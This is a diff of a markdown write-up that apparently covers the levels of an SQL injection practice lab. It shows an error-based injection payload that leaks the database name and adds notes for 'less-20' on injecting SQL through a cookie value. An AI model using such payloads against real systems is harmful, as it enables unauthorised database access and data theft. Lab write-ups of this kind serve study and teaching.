@@ -123,3 +123,11 @@ payload
 ```mysql
 ' and (select 1 from(select count(*),concat((select database()),floor(rand()*2))a from information_schema.tables group by a)b) and '1'='1
 ```
+less-20
+=======
+
+form the soruce cose we can see that there it's is fecting data from database using our cookie value so we can inject sql quries in the cookie value
+
+payload
+
+![image](https://user-images.githubusercontent.com/61080375/110950149-7b65b580-8369-11eb-8abd-8306165ba3da.png)
